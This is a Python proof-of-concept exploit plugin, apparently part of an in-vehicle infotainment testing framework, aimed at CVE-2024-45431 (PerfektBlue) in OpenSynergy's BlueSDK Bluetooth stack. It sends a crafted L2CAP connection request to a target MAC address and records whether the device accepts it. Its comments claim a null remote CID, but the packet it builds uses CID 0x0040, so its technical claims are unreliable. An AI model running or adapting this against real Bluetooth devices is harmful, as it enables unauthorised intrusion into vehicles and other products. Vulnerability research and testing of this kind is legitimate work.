"""
PoC Name: BlueSDK L2CAP Null CID (PerfektBlue)
CVE: CVE-2024-45431
Component: BlueSDK Bluetooth Stack (L2CAP)
Category: Wireless
Severity: Critical
CVSS: 8.8
Description: 利用OpenSynergy BlueSDK中L2CAP远程CID验证不当,创建null CID通道导致RCE。
Prerequisites: Linux蓝牙适配器, 目标设备运行BlueSDK栈。
Usage: python3 46_BT_PerfektBlue_L2CAP.py <target_mac>
"""
import sys
import socket
import struct
from iv_plugin_base import IVIVulnerabilityPlugin
class PerfektBlueL2CAPPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        if not self.params.get("bd_addr"):
            raise RuntimeError("需要指定目标蓝牙MAC地址")
        return True
    def exploit(self):
        target = self.params["bd_addr"]
        self.logger.info(f"PerfektBlue L2CAP Null CID测试: {target}")
        self.logger.info("CVE-2024-45431: BlueSDK L2CAP远程CID验证漏洞")
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
            s.settimeout(5)
            s.connect((target, 0))
            # Send L2CAP Connection Request with remote CID = 0x0000 (null)
            # L2CAP signaling: Code=0x02 (ConnReq), ID=0x01, Len=4, PSM=0x0001, SCID=0x0040
            conn_req = struct.pack("<BBHHH", 0x02, 0x01, 4, 0x0001, 0x0040)
            s.send(conn_req)
            self.logger.info("[*] 发送L2CAP连接请求(CID=null)...")
            try:
                resp = s.recv(1024)
                if len(resp) > 8:
                    result_code = struct.unpack("<H", resp[8:10])[0] if len(resp) > 9 else 0xFF
                    if result_code == 0:
                        self.logger.warning("[+] L2CAP连接被接受(null CID)! BlueSDK可能存在漏洞")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = "L2CAP accepted null remote CID"
                    else:
                        self.logger.info(f"连接被拒绝(result={result_code})")
                        self.results["vulnerable"] = False
                else:
                    self.results["vulnerable"] = False
            except socket.timeout:
                self.logger.info("未收到响应")
                self.results["vulnerable"] = False
            s.close()
        except Exception as e:
            self.logger.info(f"蓝牙连接失败: {e}")
            self.results["vulnerable"] = False
        return self.results
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 46_BT_PerfektBlue_L2CAP.py <target_mac>")
        sys.exit(1)
    plugin = PerfektBlueL2CAPPlugin({"target_ip": "N/A", "bd_addr": sys.argv[1]})
    plugin.run_verify()
